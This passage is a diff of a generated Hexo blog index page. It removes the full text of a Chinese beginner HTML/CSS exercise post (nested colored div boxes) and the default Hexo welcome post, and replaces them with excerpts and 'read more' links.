class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
-<h2 id="4-小练习"><a href="#4-小练习" class="headerlink" title="4. 小练习"></a>4. 小练习</h2><h3 id="test1-html"><a href="#test1-html" class="headerlink" title="test1.html"></a><code>test1.html</code></h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>练习<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span><span class="css"></span></div><div class="line">		<span class="selector-class">.div_class</span>&#123;</div><div class="line">			<span class="attribute">width</span>: <span class="number">300px</span>;</div><div class="line">			<span class="attribute">height</span>: <span class="number">300px</span>;</div><div class="line">			<span class="attribute">background-color</span>: blue;</div><div class="line">		&#125;</div><div class="line">	<span class="tag">&lt;/<span class="name">style</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span> <span class="attr">href</span>=<span class="string">"CSS/test1.css"</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">	<span class="comment">&lt;!-- .div_$*3 --&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"width:100px;height:100px;background-color:red;"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"div_class"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"div_id"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
-<h3 id="test1-css"><a href="#test1-css" class="headerlink" title="test1.css"></a><code>test1.css</code></h3><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="selector-id">#div_id</span>&#123;</div><div class="line">	<span class="attribute">width</span>: <span class="number">500px</span>;</div><div class="line">	<span class="attribute">height</span>: <span class="number">500px</span>;</div><div class="line">	<span class="attribute">background-color</span>: green;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p><img src="http://upload-images.jianshu.io/upload_images/2836722-bcda108279daadce.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="test1预览效果"></p>
-<hr>
-<h3 id="test2-html"><a href="#test2-html" class="headerlink" title="test2.html"></a><code>test2.html</code></h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>练习2<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span> <span class="attr">href</span>=<span class="string">"CSS/test2.css"</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"p1"</span>&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"p2"</span>&gt;</span></div><div class="line">			<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"p3"</span>&gt;</span></div><div class="line">				<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"p4"</span>&gt;</span></div><div class="line">					<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"p5"</span>&gt;</span></div><div class="line">						<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"p6"</span>&gt;</span></div><div class="line">							<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"p7"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">						<span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">					<span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">				<span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">			<span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">		<span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
-<h3 id="test2-css"><a href="#test2-css" class="headerlink" title="test2.css"></a><code>test2.css</code></h3><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"><span class="selector-id">#p1</span>&#123;</div><div class="line">	<span class="attribute">width</span>: <span class="number">700px</span>;</div><div class="line">	<span class="attribute">height</span>: <span class="number">700px</span>;</div><div class="line">	<span class="attribute">background-color</span>: red;</div><div class="line">&#125;</div><div class="line"><span class="selector-id">#p2</span>&#123;</div><div class="line">	<span class="attribute">width</span>: <span class="number">600px</span>;</div><div class="line">	<span class="attribute">height</span>: <span class="number">600px</span>;</div><div class="line">	<span class="attribute">background-color</span>: orange;</div><div class="line">&#125;</div><div class="line"><span class="selector-id">#p3</span>&#123;</div><div class="line">	<span class="attribute">width</span>: <span class="number">500px</span>;</div><div class="line">	<span class="attribute">height</span>: <span class="number">500px</span>;</div><div class="line">	<span class="attribute">background-color</span>: yellow;</div><div class="line">&#125;</div><div class="line"><span class="selector-id">#p4</span>&#123;</div><div class="line">	<span class="attribute">width</span>: <span class="number">400px</span>;</div><div class="line">	<span class="attribute">height</span>: <span class="number">400px</span>;</div><div class="line">	<span class="attribute">background-color</span>: green;</div><div class="line">&#125;</div><div class="line"><span class="selector-id">#p5</span>&#123;</div><div class="line">	<span class="attribute">width</span>: <span class="number">300px</span>;</div><div class="line">	<span class="attribute">height</span>: <span class="number">300px</span>;</div><div class="line">	<span class="attribute">background-color</span>: cyan;</div><div class="line">&#125;</div><div class="line"><span class="selector-id">#p6</span>&#123;</div><div class="line">	<span class="attribute">width</span>: <span class="number">200px</span>;</div><div class="line">	<span class="attribute">height</span>: <span class="number">200px</span>;</div><div class="line">	<span class="attribute">background-color</span>: blue;</div><div class="line">&#125;</div><div class="line"><span class="selector-id">#p7</span>&#123;</div><div class="line">	<span class="attribute">width</span>: <span class="number">100px</span>;</div><div class="line">	<span class="attribute">height</span>: <span class="number">100px</span>;</div><div class="line">	<span class="attribute">background-color</span>: purple;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p><img src="http://upload-images.jianshu.io/upload_images/2836722-6b5f5b4a67e9ecad.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="test1预览效果"></p>
-
+<p>+
+          
       
     </div>
     
@@ -1073,6 +772,10 @@
       
 
       
+      
+        <p class="article-more-link">
+          <a href="/2015/03/28/HTML-5-基础（一）/#more">阅读全文 >></a>
+        </p>
       
       <div class="clearfix"></div>
     </div>
@@ -1119,16 +822,8 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="external">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="external">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="external">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="external">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo new <span class="string">"My New Post"</span></div></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="external">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo server</div></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="external">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo generate</div></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="external">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo deploy</div></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="external">Deployment</a></p>
-
+              <p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.<br>+
+          
       
     </div>
     
@@ -1137,6 +832,10 @@
       
 
       
+      
+        <p class="article-more-link">
+          <a href="/2015/03/09/hello-world/#more">阅读全文 >></a>
+        </p>
       
       <div class="clearfix"></div>
     </div>
